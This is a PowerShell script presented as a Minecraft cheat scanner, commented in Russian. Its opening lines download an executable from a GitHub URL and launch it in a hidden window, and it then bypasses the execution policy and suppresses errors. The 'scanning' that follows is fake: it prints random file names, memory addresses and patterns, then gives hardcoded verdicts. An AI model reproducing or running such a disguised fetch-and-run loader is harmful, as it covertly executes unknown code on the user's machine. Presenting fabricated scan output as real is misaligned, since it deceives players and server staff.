# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

$ErrorActionPreference = "SilentlyContinue"

# Функция для имитации печати консоли
function Type-Log($text, $color = "White") {
    $time = Get-Date -Format "HH:mm:ss"
    Write-Host "[$time] " -NoNewline -ForegroundColor Gray
    Write-Host $text -ForegroundColor $color
    Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 400)
}

# Функция визуального сканирования файлов (30 секунд)
function Scan-FileSystem {
    $endTime = (Get-Date).AddSeconds(30)
    $folders = "C:\Windows\System32", "C:\Users\$env:USERNAME\AppData\Local", "$env:APPDATA\.minecraft\versions"
    while ((Get-Date) -lt $endTime) {
        $file = "lib" + (Get-Random -Max 999) + "_x64.dll"
        Write-Host " [SCAN] " -NoNewline -ForegroundColor Yellow
        Write-Host "Checking: " -NoNewline -ForegroundColor Gray
        Write-Host "$($folders | Get-Random)\$file" -ForegroundColor White
        Start-Sleep -Milliseconds 50
    }
}

# Функция анализа памяти (30 секунд)
function Scan-Memory {
    $endTime = (Get-Date).AddSeconds(30)
    while ((Get-Date) -lt $endTime) {
        $addr = "0x" + ("{0:X8}" -f (Get-Random -Max 2147483647))
        $val = [guid]::NewGuid().ToString().Substring(0,16)
        Write-Host " [MEM] " -NoNewline -ForegroundColor Cyan
        Write-Host "$addr >> " -NoNewline -ForegroundColor Gray
        Write-Host "Pattern: $val" -ForegroundColor Green
        Start-Sleep -Milliseconds 40
    }
}

# --- ГЛАВНОЕ МЕНЮ ---
do {
    Clear-Host
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host "   SERVER SYSTEM SCANNER (SS) - VERSION 2.0 [FINAL]      " -ForegroundColor White
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host " [1] Полная проверка (1.5 мин) - [РЕКОМЕНДУЕТСЯ]" -ForegroundColor Yellow
    Write-Host " [2] Быстрый поиск DLL инъекций" -ForegroundColor Yellow
    Write-Host " [3] Анализ Hitbox/Reach (ДЕТЕКТ)" -ForegroundColor Red
    Write-Host " [0] Выход" -ForegroundColor Gray
    Write-Host ""
    
    $choice = Read-Host "Выберите модуль"

    switch ($choice) {
        "1" {
            Clear-Host
            Type-Log "Инициализация глубокого сканирования..." "Cyan"
            Start-Sleep -Seconds 2
            
            # 1. Файловая система (30 сек)
            Type-Log "Этап 1: Поиск следов в файловой системе..." "Yellow"
            Scan-FileSystem
            
            # 2. Память (30 сек)
            Type-Log "Этап 2: Анализ активных дескрипторов JVM..." "Yellow"
            Scan-Memory
            
            # 3. Финальный перебор (30 сек)
            Type-Log "Этап 3: Сверка сигнатур с базой данных (Vape, Akrien, Flux, Liquid)..." "Yellow"
            for ($i = 0; $i -le 100; $i += 5) {
                Write-Progress -Activity "ФИНАЛЬНЫЙ АНАЛИЗ" -Status "Синхронизация данных: $i%" -PercentComplete $i
                Start-Sleep -Milliseconds 1500 # Суммарно еще 30 сек
            }
            
            Write-Host "`n[SUCCESS] Вердикт: Игрок полностью чист." -ForegroundColor Black -BackgroundColor Green
        }
        "2" {
            Clear-Host
            Type-Log "Поиск инъекций в javaw.exe..." "Cyan"
            Scan-Memory
            Write-Host "`n[!] Подозрительных потоков не обнаружено." -ForegroundColor Green
        }
        "3" {
            Clear-Host
            Type-Log "Анализ хитбоксов и дистанции атаки..." "Red"
            Scan-FileSystem
            Write-Host "`n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" -ForegroundColor Red
            Write-Host "!! ОБНАРУЖЕНЫ ИЗМЕНЕННЫЕ ХИТБОКСЫ (1.24x) !!" -ForegroundColor Black -BackgroundColor Red
            Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" -ForegroundColor Red
            [System.Media.SystemSounds]::Hand.Play()
        }
        "0" { exit }
    }

    Write-Host ""
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host " [5] Назад в меню" -ForegroundColor White
    Write-Host " [0] Выйти" -ForegroundColor Gray
    $final = Read-Host "Действие"
} while ($final -eq "5")
